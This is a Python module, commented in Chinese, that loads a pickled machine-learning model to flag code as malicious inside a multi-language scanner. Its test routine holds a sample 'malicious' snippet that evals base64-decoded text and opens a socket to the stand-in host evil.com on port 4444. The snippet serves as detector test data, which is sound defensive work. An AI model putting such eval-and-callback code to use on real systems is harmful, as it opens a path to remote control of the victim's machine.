#!/usr/bin/env python3
"""
Round 24 - ML 分类器集成

将 ML 模型集成到多语言扫描器
"""

import sys
import pickle
from pathlib import Path
from typing import Tuple, Dict

sys.path.insert(0, str(Path(__file__).parent.parent))

from features.feature_extractor import FeatureExtractor

class MLClassifier:
    """ML 分类器 (集成到扫描器)"""
    
    def __init__(self, model_path: str = None):
        self.feature_extractor = FeatureExtractor()
        self.model = None
        self.feature_names = None
        
        if model_path and Path(model_path).exists():
            self.load_model(model_path)
    
    def load_model(self, model_path: str):
        """加载模型"""
        try:
            with open(model_path, 'rb') as f:
                model_data = pickle.load(f)
            
            self.model = model_data['model']
            self.feature_names = model_data['feature_names']
            print(f"📥 ML 模型已加载：{model_path}")
        except Exception as e:
            print(f"⚠️  ML 模型加载失败：{e}")
    
    def predict(self, code: str, language: str) -> Tuple[bool, float, str]:
        """
        预测代码是否恶意
        
        返回：
            (is_malicious, confidence, details)
        """
        if self.model is None:
            return False, 0.0, "ML model not loaded"
        
        # 提取特征
        features = self.feature_extractor.extract_all_features(code, language)
        
        # 预测
        try:
            import numpy as np
            X = np.array([list(features.values())])
            pred = self.model.predict(X)[0]
            proba = self.model.predict_proba(X)[0]
            
            is_malicious = pred == 1
            confidence = proba[1] if is_malicious else proba[0]
            
            details = f"ML prediction (confidence: {confidence:.2f})"
            
            return is_malicious, confidence, details
        except Exception as e:
            return False, 0.0, f"ML prediction error: {e}"
    
    def get_feature_importance(self, code: str, language: str) -> Dict[str, float]:
        """获取特征重要性"""
        if self.model is None or not hasattr(self.model, 'feature_importances_'):
            return {}
        
        features = self.feature_extractor.extract_all_features(code, language)
        feature_values = list(features.values())
        feature_names = list(features.keys())
        
        import numpy as np
        importances = self.model.feature_importances_
        
        importance_dict = {}
        for name, value, imp in zip(feature_names, feature_values, importances):
            importance_dict[name] = {
                'value': value,
                'importance': imp,
            }
        
        # 按重要性排序
        sorted_importance = sorted(
            importance_dict.items(),
            key=lambda x: x[1]['importance'],
            reverse=True
        )[:10]
        
        return dict(sorted_importance)


def main():
    """测试 ML 分类器"""
    print("=" * 60)
    print("🤖 ML 分类器测试")
    print("=" * 60)
    
    # 查找模型文件
    models_dir = Path(__file__).parent.parent / 'round24' / 'ml' / 'models'
    model_files = list(models_dir.glob('*.pkl'))
    
    if not model_files:
        print("❌ 未找到模型文件，请先训练模型")
        return
    
    latest_model = max(model_files, key=lambda p: p.stat().st_mtime)
    print(f"\n📥 使用模型：{latest_model.name}")
    
    classifier = MLClassifier(str(latest_model))
    
    # 测试样本
    test_cases = [
        # 恶意
        ("""
import os
import base64

code = "aGVsbG8gd29ybGQ="
decoded = base64.b64decode(code)
eval(decoded)

import socket
s = socket.socket()
s.connect(('evil.com', 4444))
""", 'python', True, "Python 恶意样本"),
        
        # 安全
        ("""
def calculate_sum(numbers):
    '''Calculate sum of numbers'''
    total = 0
    for num in numbers:
        total += num
    return total

if __name__ == '__main__':
    result = calculate_sum([1, 2, 3, 4, 5])
    print(f"Sum: {result}")
""", 'python', False, "Python 安全样本"),
    ]
    
    print("\n🧪 测试预测:")
    for code, language, expected, description in test_cases:
        is_malicious, confidence, details = classifier.predict(code, language)
        
        status = "✅" if is_malicious == expected else "❌"
        print(f"\n{status} {description}")
        print(f"   预测：{'恶意' if is_malicious else '安全'}")
        print(f"   置信度：{confidence:.4f}")
        print(f"   期望：{'恶意' if expected else '安全'}")
        print(f"   结果：{'正确' if is_malicious == expected else '错误'}")
    
    print("\n" + "=" * 60)


if __name__ == '__main__':
    main()
